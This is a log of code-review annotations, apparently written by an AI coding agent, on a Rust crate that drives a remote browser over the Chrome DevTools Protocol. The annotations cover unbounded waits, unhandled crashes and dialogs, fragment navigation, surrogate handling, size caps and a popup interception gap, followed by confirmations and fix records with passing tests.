{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547910Z","id":"5f390df392cf5ef2f20a67b6b3fb8263ab64648c5f2475d85f7f89c7a3cd4833","body":{"detail":"Cdp bounds only its reads (cdp.rs read races recv against the deadline and the CancelToken); Driver::handle awaits self.policy.decide(&req) directly, and TestPolicy::decide reaches Site::answer, which awaits BrowserSource::site_api (an HTTP call to the daemon on a real host, serve.rs 263-268), Store::read_asset_async and read_file_async. While it waits, neither the deadline nor a cancellation is observed, so a stalled API answer keeps the remote browser open and billed beyond timeout_s (spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 8.2 prices the pre-check at the time cap as the bound of what a call can cost), and a cancelled run does not stop. BrowserSource::site_api's contract (mod.rs 175-177) does not promise a bound. The transport's send is unbounded too (cdp.rs module docs), the same exposure on a socket that stops draining.","kind":"concern","span":{"start":{"line":477},"end":{"line":477},"content_hash":"1773eca023c9aa11ffae7ff08bc3b956178b2dba120bd0abeef47f05caaabfc5"},"suggested_fix":"Give Cdp a way to race a future against its deadline and cancel (e.g. `async fn bounded<T>(&mut self, f: impl Future<Output = T>) -> Result<T, CdpFail>` sharing read's poll_fn) and wrap policy.decide in it; on Deadline or Cancelled set ended and fall into the existing after-load handling. Add a test with a policy whose decide never resolves and a deadline that fires.","summary":"policy.decide is awaited outside the deadline and cancellation: a host's site_api or a store read that stalls holds the test past its time cap","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547951Z","id":"a7552373ab329c7cfe383a9680fa15121f2e2857f04d56ff507b874e9f6a8266","body":{"detail":"Driver::handle ignores Inspector.targetCrashed, Target.targetCrashed and Target.detachedFromTarget (https://chromedevtools.github.io/devtools-protocol/tot/Inspector/#event-targetCrashed). A page that exhausts memory (e.g. an artifact with a runaway array) crashes its renderer; pending Runtime.evaluate calls on its session then wait until the deadline, the result says the time ran out, and the full timeout is charged, while the useful answer is that the page crashed.","kind":"suggestion","span":{"start":{"line":575},"end":{"line":576},"content_hash":"2f97c2b4f993532151a035da3b4678c00bbafc0e6725fd6fd8f36fab512d53f2"},"suggested_fix":"On a crash or detach event for self.session, end the test as after-load (push an error 'the page crashed' or 'the page closed', skip remaining steps) without waiting for the deadline; before load, answer browser_unavailable with opened set.","summary":"A crashed or detached page is not noticed: the driver waits for answers that never come until the deadline and reports \"time\" instead of the crash","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:54:47.733090Z","id":"ee9cc794a7b22fa59a4ef86c7f1569a36fc751eee688c1b9e3ca6269f4425377","body":{"detail":"Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §11 ('Audit') lists Browser Run's session ID when known among a bot.browser record's fields. crates/clax-store/src/toolpath/redact.rs:370-380 already classifies `session` as Safe, and record 26ea61ec on that file names it among the fields the Spend path writes. But BrowserSource::open answers Box<dyn CdpTransport> alone, and TestRun has no session field. So crates/clax-bot/src/clax/browser.rs:366-372 and 564 write path, viewport, version, ms and passed, and never session. The daemon's source (plan docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 12) has nowhere to put the ID it reads from the upgrade.","kind":"suggestion","span":{"start":{"line":156},"end":{"line":160},"content_hash":"d2eb4fa46a589beee3913b061ec5805385a504f76a6b1d345eb2ce7d08316e88"},"suggested_fix":"Before Task 12, let open answer the session ID beside the transport: for example a struct Opened { transport, session: Option<String> }, or a CdpTransport::session() method. Have browser_fresh add (\"session\", ID) to the audit fields when it is known, and assert it in a_test_answers_and_is_charged_its_measured_time with a FakeBrowserSource that reports one.","summary":"The bot.browser record can never carry Browser Run's session ID: BrowserSource::open returns only a transport","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:02.511947Z","id":"1f97c6c47fd19b231cdf799d3c94f2083722b047a2dbe72d529f660db39fdb0e","body":{"detail":"crates/clax-bot/src/browser/mod.rs:160: `async fn open(&self, cancel: &CancelToken) -> Result<Box<dyn CdpTransport>, BrowserError>`. TestRun (crates/clax-bot/src/browser/session.rs:198-206) has outcome, shots, opened_at, closed_at. crates/clax-bot/src/clax/browser.rs:366-372 builds the audit fields from version, path and viewport, and tested() adds ms and passed (563-564, 599); nothing writes session. Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 11 (lines 704-705) lists 'Browser Run's session ID when known' in the record; the design signature in section 4.4 (line 243) is the one implemented, so 'when known' is never, and the gap is in the design itself, which the owner may resolve either way. Suggestion is the right kind.","kind":"comment","references":"ee9cc794a7b22fa59a4ef86c7f1569a36fc751eee688c1b9e3ca6269f4425377","summary":"confirmed: open answers only Box<dyn CdpTransport> and TestRun has no session field, so bot.browser never carries the session ID","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.310809Z","id":"b1034e7d54af0bbe636a807fd122487952c80276378d119ebb37932c36882ed0","body":{"detail":"At 8f4a76898: Driver::open (crates/clax-bot/src/browser/session.rs 818-882) sends Target.createTarget and Target.attachToTarget for one page, then Fetch.enable (line 851) on that session only. `grep -n 'setAutoAttach\\|setDiscoverTargets\\|attachedToTarget\\|targetCreated' crates/clax-bot/src/browser/*.rs` finds nothing. preamble_js (session.rs 215-224) removes the RTC constructors but not window.open. Driver::handle answers Fetch.requestPaused with send_only on self.session (session.rs 497-523), not ev.session. Fetch interception applies to the session it was enabled on (https://chromedevtools.github.io/devtools-protocol/tot/Fetch/#method-enable), so a popup target's navigation is not paused, which contradicts docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 6.4 (top-level navigations to another origin are failed). The Failure line names a concrete input (window.open from a click step's handler), so blocker is the right kind.","kind":"comment","references":"68df9a00ae06a362f58ec3d3b8adc96c834330c26aa19d07a482bbb3557b094e","summary":"confirmed: only the page's own session gets Fetch.enable; nothing attaches a popup target","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.311244Z","id":"3753b0a0f59e1edf32b79052ebb4f8a0e7ff2951f454aac98146fce6df3095b2","body":{"detail":"At 8f4a76898: Step::Goto (session.rs 908-914) calls navigate(start.goto(to)); Start::goto (session.rs 173-184) keeps the '#…' part, and Origin::url (serve.rs 77-84) maps index.html to https://<host>/, so goto 'index.html#settings' on a test started at index.html navigates to https://<host>/#settings, a same-document navigation. Driver::navigate (session.rs 628-656) sets self.loaded = false and, after the Page.navigate answer, loops `while !self.loaded` on next_event; only Page.loadEventFired sets it (line 575). Page.navigate omits loaderId for a same-document navigation and no load event follows (https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigate), so the wait ends at the deadline (CdpFail::Deadline, step failed, rest skipped, \"time\" in truncated). Concrete Failure given; blocker stands.","kind":"comment","references":"3211e8ad972c15d5e2032b00d77f7067f9bc57254af7bbf1f38a73f450f3482f","summary":"confirmed: a fragment-only goto waits for a load event Chrome never sends","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.311642Z","id":"8fb47b52756d1564e733b0bfe5732c40e29690fada95990c585638e19fb18231","body":{"detail":"At 8f4a76898: Driver::handle (session.rs 470-579) matches Fetch.requestPaused, Runtime.consoleAPICalled, Log.entryAdded, Runtime.exceptionThrown, Network.requestWillBeSent, Network.loadingFailed and Page.loadEventFired, then `_ => {}` (line 576); `grep -n javascriptDialog crates/clax-bot/src/browser/*.rs` finds nothing, and Page.enable is sent in open (session.rs 856). With the Page domain enabled, a dialog stays open until Page.handleJavaScriptDialog (https://chromedevtools.github.io/devtools-protocol/tot/Page/#event-javascriptDialogOpening), so an inline alert() blocks the load (browser_timeout via setup_error, session.rs 390-411) and a confirm() in a clicked handler holds the next evaluate to the deadline. Concrete Failure given; blocker stands.","kind":"comment","references":"cf987e89c6a627f1a1cc3d3454a4a42c47f24acc814ed346cfaa3934757e1a47","summary":"confirmed: Page.javascriptDialogOpening falls through to `_ => {}` and is never answered","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.312022Z","id":"96acc14f52473f3be4d80f5448e8e16a49283a68bce190f46c5db0b588d96916","body":{"detail":"At 8f4a76898: Driver::open ends with `self.navigate(...)` then `self.settle().await?;` (session.rs 877-881); drive maps any CdpFail from open with `.map_err(|f| setup_error(f, opts.timeout_s))` (session.rs 670-674), and setup_error turns Deadline into browser_timeout 'the page did not load within N s' (session.rs 390-396), returning Err so drive's gathered console and errors are not put in a result (run_test, session.rs 303-307). docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 5.4 limits browser_timeout to 'the deadline passed before the page loaded'. Concern is the right kind.","kind":"comment","references":"c520c38433664721f969ba643c142a4d14e29e02b17eb39808d1ca5bbfde48f9","summary":"confirmed: a settle failure after the load event is mapped through setup_error as a before-load error","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/cdp.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.312401Z","id":"6a299071c2281a7f6f2108d9361842bc053bf25f142272efb98d024ee385d0a1","body":{"detail":"At 8f4a76898: parse (crates/clax-bot/src/browser/cdp.rs 141-168) maps a serde_json error to CdpFail::Protocol, and Cdp::read returns `parse(&frame)?` (cdp.rs 295), ending the wait. serde_json 1.0.151 (Cargo.lock line 3237-3238), src/read.rs 911-914 and 954-960: with validate (deserializing a String) a lone \\uD8xx or \\uDCxx escape is ErrorCode::LoneLeadingSurrogateInHexEscape / UnexpectedEndOfHexEscape. A page string with a lone surrogate reaches a frame as such an escape, so the page decides whether the wait fails. Concern is the right kind.","kind":"comment","references":"394c21e0cb02c1c2e159707f34873e30f782b3f04f7cc509d85036c0d1bca0e4","summary":"confirmed: an unparseable frame fails the current wait, and serde_json refuses lone surrogate escapes","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.312777Z","id":"ff6450beb8fb68f5cee7bd0e8e9c427ecfc3e82e412bdf25df78709f034e0ba6","body":{"detail":"At 8f4a76898: collect_js (session.rs 263-269) uses outerHTML.slice(0, MAX_HTML + 1) and innerText.slice(0, MAX_TEXT_CHARS + 1) (MAX_HTML 100_000, MAX_TEXT_CHARS 20_000, session.rs 89-91), which count UTF-16 code units; Driver::collected (session.rs 800-813) decides the cut with cut_chars (session.rs 360-365), which counts chars. `grep -n 'htmlLength\\|textLength' crates/clax-bot/src/browser/session.rs` shows them only in collect_js and a test fixture (line 1244), never read. A slice ending between a surrogate pair yields a lone surrogate, which serde_json refuses (see thread 394c21e0). Concern is the right kind.","kind":"comment","references":"32a61e203dfa61fbe036fa27fde9386781845b92d6131c031b5cb05d8740f590","summary":"confirmed: collect_js slices by UTF-16 units, collected checks the cut by chars, and htmlLength/textLength go unread","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.313149Z","id":"962c98a005db3ac467b386e9b0236fb21d80f6179d163ba213a12c6a257c60ca","body":{"detail":"At 8f4a76898: eval_js (crates/clax-bot/src/browser/opts.rs 880-884) measures with the page's JSON.stringify and TextEncoder; the Step::Eval arm (session.rs 993-1003) parses v[\"json\"] with no length check against MAX_EVAL_BYTES. tests_of (session.rs 245-260) takes at most MAX_TEST_FAILURES (50) failures but copies each name and error whole; collected copies title and url whole (session.rs 789-795). html and text, by contrast, are re-cut in Rust with cut_chars (session.rs 802-813). Concern is the right kind. Same finding as thread e77cb375.","kind":"comment","references":"9354968d79e3ae5fd2525e8410777e96d432a53a87ede022f38e90dd8a16df3a","summary":"confirmed: the 16 KiB eval cap and the test failure texts are bounded only in page script","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.313519Z","id":"380e400b128ace127e0e87f4ba8606e5db31d6559a0a87a2b42ebb0b8b6c3da8","body":{"detail":"At 8f4a76898: Driver::handle awaits `self.policy.decide(&req).await` directly (session.rs 477); TestPolicy::decide (session.rs 130-134) awaits Site::answer, which awaits source.site_api (crates/clax-bot/src/browser/serve.rs 256-262), store.read_asset_async (serve.rs 284-289) and the file read (serve.rs 296-311). The deadline and CancelToken are raced only inside Cdp::read (crates/clax-bot/src/browser/cdp.rs 260-290). BrowserSource::site_api's doc (crates/clax-bot/src/browser/mod.rs 175-177) promises no bound. Concern is the right kind.","kind":"comment","references":"5f390df392cf5ef2f20a67b6b3fb8263ab64648c5f2475d85f7f89c7a3cd4833","summary":"confirmed: policy.decide is awaited with no deadline or cancellation around it","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.313910Z","id":"4948fdd3a662357b1447daf512e16aad3d0e7df6f9ad97b888768ebd42067134","body":{"detail":"At 8f4a76898: Driver::handle (session.rs 470-579) has no arm for Inspector.targetCrashed, Target.targetCrashed or Target.detachedFromTarget; `grep -n 'targetCrashed\\|detachedFromTarget' crates/clax-bot/src/browser/*.rs` finds nothing. A pending wait then ends only by an answer, the deadline, cancellation or socket close (cdp.rs module docs, 29-35). Suggestion is the right kind.","kind":"comment","references":"a7552373ab329c7cfe383a9680fa15121f2e2857f04d56ff507b874e9f6a8266","summary":"confirmed: crash and detach events fall to `_ => {}`; nothing ends the test early","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.314803Z","id":"7eb34a7dd138562669b278115ed986d5b8940a4212a41ff9d5beda7b25719dbf","body":{"detail":"At 8f4a76898: Fetch.enable is sent only on the session from Target.attachToTarget (session.rs 841-853); no Target.setAutoAttach, Target.setDiscoverTargets or targetCreated handling exists in crates/clax-bot/src/browser/*.rs (grep finds none), and preamble_js (session.rs 215-224) leaves window.open in place. Fetch interception is per attached session (https://chromedevtools.github.io/devtools-protocol/tot/Fetch/#method-enable). The claim holds; concern is not too high (thread 68df9a00 records the same gap as a blocker with a Failure line).","kind":"comment","references":"6f17ce40f73df37999614b872098c7b803347cd852c3b48514738adaed40744c","summary":"confirmed: a popup target is never attached, so its requests are not paused","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.315179Z","id":"dc0ca2f5474a892e776e76fdf057ca9673a5cb38d046d809e6af7f75bcfcf7b2","body":{"detail":"At 8f4a76898: eval_js (crates/clax-bot/src/browser/opts.rs 880-884) uses `JSON.stringify(v)` and `new TextEncoder().encode(s).length` in the page's world; the Step::Eval arm (crates/clax-bot/src/browser/session.rs 993-1003) returns serde_json::from_str of v[\"json\"] without measuring it. tests_of (session.rs 245-260) caps the count (MAX_TEST_FAILURES, 50) but not each name or error. wait_js's WaitFor::Ms uses the page's setTimeout (opts.rs 802-806). Concern is the right kind. Same finding as thread 9354968d.","kind":"comment","references":"e77cb375343b190045983b3b13e9f841aa3da92d3451cdccdd65da686ad6685b","summary":"confirmed: eval_js measures the cap with page globals and the driver accepts any json length","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.315556Z","id":"979b385675fff5b31d3123092b6446f942f200ae447d930f4acac4a9adf95547","body":{"detail":"At 8f4a76898: saved_tests (session.rs 756-763) passes total_ms = timeout_s * 1000 minus at_ms(), the time to the Cdp deadline. The hook (web/bridge/src/bridge.ts 219-221) first awaits usesSettled(USES_MS) (USES_MS 5000, bridge.ts 98; usesSettled races pending uses against a 5 s timer, bridge.ts 194-197) and parts.test(), and runTests starts its own clock only then (`const start = deps.now()`, web/bridge/src/harness.ts 233). A suite that runs to its totalMs therefore ends after the driver's deadline, saved_tests returns CdpFail::Deadline, and drive (session.rs 717-729) adds no tests member. Concern is the right kind.","kind":"comment","references":"f06b60496c74b9a6caf755d68155247f58c383012d379e8ba64f5ae44d26454e","summary":"confirmed: totalMs is the whole time to the deadline, but the harness's clock starts later","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.315930Z","id":"1fa644a082fd8c84b492db5697ec7535eb30393b01f6a6ff0ff52a20c2605ae9","body":{"detail":"At 8f4a76898: artifact_path (crates/clax-bot/src/browser/opts.rs 367-384) splits on '/', '?', '#' only to look for '..' and returns the string whole; parse_target (opts.rs 404-415) keeps it. The host's check (crates/clax-bot/src/clax/browser.rs 446 `files.contains_key(&target.path)` for a draft, 463 `read_file_async(artifact, n, &target.path)` for a version) then finds no 'about.html?tab=2' and refuses CODE_BROWSER_TARGET_NOT_FOUND, while Start::goto (session.rs 173-184) splits the query off for a goto step. Concern is the right kind.","kind":"comment","references":"c96fde3567e288b52b5f6715a4c1d66b97bee54d45acc2f560f4a4c8b217eceb","summary":"confirmed: target.path keeps ?query/#fragment and the existence check looks it up as a file name","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:26.316303Z","id":"74875d3f017b6caa75c6a20a5e7356b9e817c7a25b61c85a5502feba097544b7","body":{"detail":"At 8f4a76898: Origin::path_of (crates/clax-bot/src/browser/serve.rs 88-96) returns `u.path()`, which the WHATWG parser leaves percent-encoded (%2F is not a segment separator); Site::answer passes it to source.clax_file(&path) and source.site_api(person, artifact, &path_and_query) as is (serve.rs 247-262), while only the artifact-file branch decodes (Site::file, serve.rs 297). The BrowserSource docs for clax_file and site_api (crates/clax-bot/src/browser/mod.rs 168-177) say nothing about encoding or what to refuse. Suggestion is the right kind.","kind":"comment","references":"0a3c37b4d55e688a399fac24f40953a3f58f897bfe4199dc9b3e88321efa309e","summary":"confirmed: clax_file and site_api get url::Url::path() still percent-encoded, and their docs are silent on it","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:40.962986Z","id":"d157aaaec0881ffc8d193e77bf74069fc12c18faa21dfac3907e7377199f01c4","body":{"kind":"resolve","summary":"Duplicate of 68df9a00 (the same popup egress gap on crates/clax-bot/src/browser/session.rs), which carries the fix","supersedes":"6f17ce40f73df37999614b872098c7b803347cd852c3b48514738adaed40744c","tags":["reason:duplicate","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:57:41.037584Z","id":"389e8983f36f2c47999a689e4c3d625fd0f675f734a28b714c0fb701e1a8c24e","body":{"kind":"resolve","summary":"Duplicate of 9354968d (the eval cap and saved-test failure text measured only in the page), which carries the fix","supersedes":"e77cb375343b190045983b3b13e9f841aa3da92d3451cdccdd65da686ad6685b","tags":["reason:duplicate","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:23.799810Z","id":"d4b3ad60b3393b091f08b25e01cf7df038e4a143652c2b53521caf9f0b908987","body":{"kind":"resolve","ref":"git:a890bfdc6","summary":"Fixed in a890bfdc6: target.path with `?` or `#` is now invalid_args naming target.path; browser::opts::tests::the_defaults_are_the_drafts_index_on_a_desktop covers about.html?tab=2 and about.html#top and passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"c96fde3567e288b52b5f6715a4c1d66b97bee54d45acc2f560f4a4c8b217eceb","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:23.981793Z","id":"860aa5bc28534b7ce57b7212c1c5996805b73ad100622cdc473b5f0537728d3e","body":{"kind":"resolve","ref":"git:429dc29fd","summary":"Fixed in 429dc29fd: Driver::handle answers Page.javascriptDialogOpening with Page.handleJavaScriptDialog {accept: true} on the event's session and notes it in the console; browser::session::tests::a_dialog_is_accepted_and_noted (a confirm() holding the click's answer) passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"cf987e89c6a627f1a1cc3d3454a4a42c47f24acc814ed346cfaa3934757e1a47","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:24.167038Z","id":"4c2a7259e432db51d24edf3d4b918bfa67a534518157e9d42b3b69686a836020","body":{"kind":"resolve","ref":"git:429dc29fd","summary":"Fixed in 429dc29fd: Driver::navigate treats a Page.navigate answer without loaderId as loaded; browser::session::tests::a_goto_to_a_fragment_waits_for_no_load passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"3211e8ad972c15d5e2032b00d77f7067f9bc57254af7bbf1f38a73f450f3482f","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:24.353583Z","id":"7c1abedb948c87cb32d84fa085a71d02ac9b9510a3cad50b302c779a28f6b4f6","body":{"kind":"resolve","ref":"git:46f1d96f4","summary":"Fixed in 46f1d96f4: open stops at the load and drive settles after it, ending a failed settle as a step's failure; browser::session::tests::the_deadline_during_the_settle_answers_what_was_gathered (console kept, steps skipped, time in truncated) passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"c520c38433664721f969ba643c142a4d14e29e02b17eb39808d1ca5bbfde48f9","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:24.545716Z","id":"116e312715b62ea1e45a2069bde8130a7c4fd6508104b4579911d593023187da","body":{"kind":"resolve","ref":"git:46f1d96f4","summary":"Fixed in 46f1d96f4: Cdp::bounded races the policy's answer against the deadline and cancellation; browser::session::tests::a_stalled_host_answer_ends_at_the_deadline (a decide that never resolves) answers browser_timeout with Browser.close sent. The transport's unbounded send stays as the cdp.rs module docs say. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"5f390df392cf5ef2f20a67b6b3fb8263ab64648c5f2475d85f7f89c7a3cd4833","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/cdp.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:24.731460Z","id":"6c0f909c399f078c78838099f6c4b1f5842ff22d48768eb103353cb494883389","body":{"kind":"resolve","ref":"git:0ffc9f9d0","summary":"Fixed in 0ffc9f9d0: parse retries a refused frame with lone surrogate escapes replaced by U+FFFD (mend_surrogates); browser::cdp::tests::a_lone_surrogate_from_the_page_is_read_as_a_replacement passes for an event and an answer. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"394c21e0cb02c1c2e159707f34873e30f782b3f04f7cc509d85036c0d1bca0e4","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:24.914856Z","id":"570aff7666dd60dc8c377bb081bba944da6e955a25d2e31accee211fc790f1c3","body":{"kind":"resolve","ref":"git:e3cba7085","summary":"Fixed in e3cba7085: collect_js cuts without splitting a surrogate pair and Driver::collected marks html/text cut from the page's whole lengths; browser::session::tests::what_the_page_answers_is_capped_here_too (120,000 code units of emoji) passes. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"32a61e203dfa61fbe036fa27fde9386781845b92d6131c031b5cb05d8740f590","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T08:14:25.100932Z","id":"363c8ad339be33ce684864b0b779d53bc6e7f656b5add2b1fd41e4c41ec7c3be","body":{"kind":"resolve","ref":"git:e3cba7085","summary":"Fixed in e3cba7085: The Eval arm refuses a json over MAX_EVAL_BYTES whatever the page says; tests_of cuts each failure's name and error to 1,000 characters; title and URL are cut too. browser::session::tests::what_the_page_answers_is_capped_here_too and a_saved_test_failure_is_cut pass. wait_js's in-page timer is left as is. bazel test //crates/clax-bot/... //crates/clax-store/... //crates/clax-server/... //crates/clax-cli/... //bazel/wasm:check //web:unit //web:lint //web:typecheck //web:bundle_size: 33 tests pass (run at 835edf396; //crates/clax-bot/... passes again after the rustfmt commit da686e589).","supersedes":"9354968d79e3ae5fd2525e8410777e96d432a53a87ede022f38e90dd8a16df3a","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
